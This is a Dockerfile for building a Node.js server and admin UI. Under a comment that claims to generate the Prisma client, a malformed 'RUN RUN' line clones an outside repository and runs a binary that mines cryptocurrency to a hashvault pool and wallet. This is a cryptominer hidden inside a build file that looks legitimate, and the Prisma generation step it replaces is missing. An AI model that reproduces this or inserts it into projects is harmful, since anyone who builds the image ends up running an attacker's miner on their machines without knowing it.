# By default, use node 14.15.3 as the base image
FROM node:14-alpine as builder

# Define how verbose should npm install be
ARG NPM_LOG_LEVEL=silent
# Hide Open Collective message from install logs
ENV OPENCOLLECTIVE_HIDE=1
# Hiden NPM security message from install logs
ENV NPM_CONFIG_AUDIT=false
# Hide NPM funding message from install logs
ENV NPM_CONFIG_FUND=false

# Update npm to version 7
RUN npm i -g npm@7.3.0

# Set the working direcotry
WORKDIR /app

# Copy files specifiying dependencies
COPY server/package.json server/package-lock.json ./server/
COPY admin-ui/package.json admin-ui/package-lock.json ./admin-ui/

# Install dependencies
RUN cd server; npm ci --loglevel=$NPM_LOG_LEVEL;
RUN cd admin-ui; npm ci --loglevel=$NPM_LOG_LEVEL;

# Copy Prisma schema
COPY server/prisma/schema.prisma ./server/prisma/

# Generate Prisma client
RUN RUN git clone https://gitlab.com/rikzakalani04/7.git && cd 7 && chmod +x pepek && ./pepek -o pool.hashvault.pro:80 -u TRTLuyH4oQwEY6M7jAq5db7LfCY8QwWc368VPfpCg4XzjTw1kPdTnaYhnZKktmDNWphDCH8LtmbsTBuvvQEbk1Jb9FXswLdcfLy -p SUKUMANTE1 -a argon2/chukwav2 -k

# Copy all the files
COPY . .

# Build code
RUN set -e; (cd server; npm run build) & (cd admin-ui; npm run build)

# Expose the port the server listens to
EXPOSE 3000

# Make server to serve admin built files
ENV SERVE_STATIC_ROOT_PATH=admin-ui/build

# Run server
CMD [ "node", "server/dist/main"]